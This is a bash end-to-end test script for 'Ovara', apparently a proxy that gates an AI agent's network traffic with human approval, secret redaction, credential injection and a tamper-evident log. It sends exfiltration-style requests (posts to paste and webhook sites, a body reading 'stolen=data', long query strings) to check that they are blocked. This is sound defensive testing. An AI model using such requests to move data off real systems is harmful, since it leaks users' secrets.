set -u
export PATH=$PATH:/usr/local/go/bin
git config --global --add safe.directory '*'
git clone -q /repo /work   # the checked-out branch of the mounted repo
(cd /work/proxy && CGO_ENABLED=0 go build -o /usr/local/bin/ovara ./cmd/ovara) || { echo "BUILD FAILED"; exit 1; }
cd /tmp && rm -rf d && ovara init d >/dev/null 2>&1

# --- configure like a user would: a real key for one API, a short approval window
cat > /tmp/cfg.py <<'PY'
import json
p = json.load(open('d/proxy.json'))
p['escalate_timeout_sec'] = 20
p['credentials'].append({"host": "httpbin.org", "headers": {"Authorization": "Bearer ${HTTPBIN_TOKEN}"}})
json.dump(p, open('d/proxy.json', 'w'), indent=2)
PY
python3 /tmp/cfg.py
SECRET="REALSECRET-9f8e7d6c5b4a3210"
HTTPBIN_TOKEN="$SECRET" ovara run -dir d -ui 127.0.0.1:9090 >/tmp/run.log 2>&1 &
for i in $(seq 1 60); do (echo > /dev/tcp/127.0.0.1/9443) 2>/dev/null && break; sleep 0.5; done

pass=0; fail=0
ok()   { echo "PASS  $1"; pass=$((pass+1)); }
bad()  { echo "FAIL  $1  -- $2"; fail=$((fail+1)); }
skip() { echo "SKIP  $1  -- $2"; }
check() { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1" "want $2, got $3"; fi; }
agent() { ( eval "$(ovara env -dir /tmp/d)"; "$@" ); }
waitpending() {
  for i in $(seq 1 30); do
    ID=$(ovara approvals -dir /tmp/d 2>/dev/null | grep -oE 'apr_[0-9a-f-]+' | head -1)
    if [ -n "$ID" ]; then echo "$ID"; return 0; fi
    sleep 1
  done
  return 1
}

echo "=== A. everyday work that must just work (no prompts)"
check "curl a trusted read host (pypi.org)" 200 "$(agent curl -s -o /dev/null -w '%{http_code}' --max-time 30 https://pypi.org/simple/requests/)"
python3 -m venv /tmp/v >/dev/null 2>&1
if agent /tmp/v/bin/pip install -q requests >/tmp/pip.log 2>&1; then ok "pip install requests (venv)"; else bad "pip install requests" "$(tail -3 /tmp/pip.log | tr '\n' ' ')"; fi
mkdir -p /tmp/np && (cd /tmp/np && npm init -y >/dev/null 2>&1)
if agent sh -c 'cd /tmp/np && npm install left-pad' >/tmp/npm.log 2>&1; then ok "npm install left-pad"; else bad "npm install left-pad" "$(tail -3 /tmp/npm.log | tr '\n' ' ')"; fi
if agent git clone -q https://github.com/octocat/Hello-World.git /tmp/hw >/tmp/git.log 2>&1; then ok "git clone from GitHub"; else bad "git clone from GitHub" "$(tail -3 /tmp/git.log | tr '\n' ' ')"; fi
if agent node -e "fetch('https://registry.npmjs.org/left-pad').then(r=>process.exit(r.status===200?0:1)).catch(e=>{console.error(e.message);process.exit(2)})" >/tmp/node.log 2>&1; then ok "Node 24 fetch() goes through Ovara"; else bad "Node fetch" "$(tr '\n' ' ' </tmp/node.log)"; fi
check "python requests via the venv" 200 "$(agent /tmp/v/bin/python -c "import requests;print(requests.get('https://pypi.org/simple/requests/',timeout=30).status_code)" 2>&1 | tail -1)"
SZ=$(agent curl -s -o /dev/null -w '%{size_download}' --max-time 60 https://pypi.org/simple/)
if [ "${SZ:-0}" -gt 1000000 ]; then ok "large streamed download ($SZ bytes)"; else bad "large download" "size=$SZ"; fi

echo "=== B. things Ovara must stop"
check "paste site is blocked" 403 "$(agent curl -s -o /dev/null -w '%{http_code}' --max-time 20 https://pastebin.com/)"
check "request-capture site POST is blocked" 403 "$(agent curl -s -o /dev/null -w '%{http_code}' --max-time 20 -X POST -d x https://webhook.site/abc)"
check "GET with a body to a TRUSTED host is refused" 403 "$(agent curl -s -o /dev/null -w '%{http_code}' --max-time 20 -X GET -d 'stolen=data' https://api.github.com/)"
LONGQ=$(head -c 700 /dev/zero | tr '\0' A)
check "huge query string to a trusted host is refused" 403 "$(agent curl -s -o /dev/null -w '%{http_code}' --max-time 20 "https://pypi.org/simple/?d=$LONGQ")"

echo "=== C. the human in the loop"
( agent curl -s -o /dev/null -w '%{http_code}' --max-time 40 https://example.com/ > /tmp/c1 ) & P=$!
if ID=$(waitpending); then ovara approve "$ID" -dir /tmp/d >/dev/null 2>&1; wait $P; check "unknown host: paused, approved, then passes" 200 "$(cat /tmp/c1)"; else wait $P; bad "unknown host: nothing became pending" "got $(cat /tmp/c1)"; fi
( agent curl -s -o /dev/null -w '%{http_code}' --max-time 40 https://example.org/ > /tmp/c2 ) & P=$!
if ID=$(waitpending); then ovara deny "$ID" -dir /tmp/d >/dev/null 2>&1; wait $P; check "unknown host: paused, DENIED by a human" 403 "$(cat /tmp/c2)"; else wait $P; bad "deny scenario: nothing pending" "got $(cat /tmp/c2)"; fi
( agent curl -s -o /dev/null -w '%{http_code}' --max-time 60 -X POST -d x https://github.com/octocat/Hello-World.git/git-receive-pack > /tmp/c3 ) & P=$!
if ID=$(waitpending); then
  ovara approvals -dir /tmp/d 2>&1 | grep -iE "push|git" | head -1 | sed 's/^/      approval text: /'
  ovara deny "$ID" -dir /tmp/d >/dev/null 2>&1; wait $P
  check "git push is paused (denied here)" 403 "$(cat /tmp/c3)"
else wait $P; bad "git push did not pause" "got $(cat /tmp/c3)"; fi
( agent curl -s -o /dev/null -w '%{http_code}' --max-time 40 -X POST -H 'Content-Type: application/json' -d '{"note":"hello-body-marker","password":"s3cretpassword99"}' "https://example.edu/api?x=query-marker&api_key=ghp_abcdefghijklmnopqrstuvwxyz0123456789" > /tmp/c4 ) & P=$!
if ID=$(waitpending); then
  SEEN=$(ovara approvals -dir /tmp/d 2>&1)
  echo "$SEEN" | grep -q "query-marker" && ok "approver sees the query string" || bad "approver does not see the query" "$SEEN"
  echo "$SEEN" | grep -q "hello-body-marker" && ok "approver sees what the body starts with" || bad "approver does not see the body" "$SEEN"
  echo "$SEEN" | grep -qE "s3cretpassword99|ghp_abcdefgh" && bad "a secret reached the approval screen" "$SEEN" || ok "secrets are redacted in the approval screen"
  TOK=$(grep -oE '#t=[A-Za-z0-9_-]+' /tmp/run.log | head -1 | cut -c4-)
  curl -s -H "Authorization: Bearer $TOK" http://127.0.0.1:9090/api/pending | grep -q "hello-body-marker" && ok "browser page gets the same preview" || bad "browser page has no preview" ""
  ovara deny "$ID" -dir /tmp/d >/dev/null 2>&1; wait $P
else wait $P; bad "POST with a body did not pause" "got $(cat /tmp/c4)"; fi
check "unanswered approval times out (neither hangs nor passes)" 504 "$(agent curl -s -o /dev/null -w '%{http_code}' --max-time 50 https://example.net/)"

echo "=== D. keys stay with Ovara"
if agent env | grep -q "$SECRET"; then bad "agent environment contains the real key" "found"; else ok "real key is NOT in the agent's environment"; fi
cat > /tmp/allow.py <<'PY'
import json, sys
host = sys.argv[1]
p = json.load(open('/tmp/d/policy.json'))
p['rules'].insert(0, {"action_type": "http.request", "environment": "*", "resource": "GET https://%s/*" % host, "allow": True, "description": "test"})
json.dump(p, open('/tmp/d/policy.json', 'w'), indent=2)
PY
python3 /tmp/allow.py httpbin.org; sleep 3
CODE=$(agent curl -s -o /tmp/hb.json -w '%{http_code}' --max-time 30 https://httpbin.org/headers)
if [ "$CODE" = 200 ]; then
  if grep -q "$SECRET" /tmp/hb.json; then bad "key echoed back to the agent" "leaked"; else ok "agent never sees the key (echo scrubbed)"; fi
  if grep -q "REDACTED" /tmp/hb.json; then ok "upstream received the injected key (shows as [REDACTED] in the echo)"; else skip "injection proof" "httpbin did not echo Authorization"; fi
else skip "credential injection + scrub" "httpbin.org unreachable (HTTP $CODE)"; fi

echo "=== E. policy edits apply live"
python3 /tmp/allow.py example.com; sleep 3
check "new allow rule takes effect without a restart" 200 "$(agent curl -s -o /dev/null -w '%{http_code}' --max-time 15 https://example.com/)"

echo "=== F. the browser approval page"
TOK=$(grep -oE '#t=[A-Za-z0-9_-]+' /tmp/run.log | head -1 | cut -c4-)
if [ -n "$TOK" ]; then ok "approval link printed with a token"; else bad "no UI link in run.log" ""; fi
check "UI page served on loopback" 200 "$(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:9090/)"
check "UI API refuses requests without the token" 401 "$(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:9090/api/pending)"
check "UI API accepts the token" 200 "$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $TOK" http://127.0.0.1:9090/api/pending)"
check "UI refuses a DNS-rebinding Host header" 403 "$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: evil.example' -H "Authorization: Bearer $TOK" http://127.0.0.1:9090/api/pending)"

echo "=== G. the record"
ovara log -dir /tmp/d 2>&1 | tail -4
if ovara log -dir /tmp/d 2>&1 | grep -q "signed and unbroken"; then ok "receipt chain verifies"; else bad "receipt chain" "not verified"; fi
cp d/var/receipts.jsonl /tmp/receipts.bak
sed -i '0,/"decision":"deny"/s//"decision":"allow"/' d/var/receipts.jsonl
if ovara log -dir /tmp/d 2>&1 | grep -qiE "tamper|broken|invalid|edited"; then ok "editing a receipt (deny to allow) is detected"; else bad "tampering NOT detected" "$(ovara log -dir /tmp/d 2>&1 | tail -2 | tr '\n' ' ')"; fi
cp /tmp/receipts.bak d/var/receipts.jsonl

echo "=== H. restart"
pkill -f "ovara run"; sleep 2
HTTPBIN_TOKEN="$SECRET" ovara run -dir d -ui off >/tmp/run2.log 2>&1 &
for i in $(seq 1 60); do (echo > /dev/tcp/127.0.0.1/9443) 2>/dev/null && break; sleep 0.5; done
check "works again after a restart" 200 "$(agent curl -s -o /dev/null -w '%{http_code}' --max-time 30 https://pypi.org/simple/requests/)"
if ovara log -dir /tmp/d 2>&1 | grep -q "signed and unbroken"; then ok "chain still valid across the restart"; else bad "chain after restart" "not valid"; fi
if ovara doctor -dir /tmp/d 2>&1 | grep -q "^FAIL"; then bad "doctor reports FAIL on a running deployment" "$(ovara doctor -dir /tmp/d 2>&1 | grep '^FAIL' | head -2)"; else ok "doctor: no FAIL items"; fi

echo
echo "RESULT: $pass passed, $fail failed"
echo "SCN_DONE"
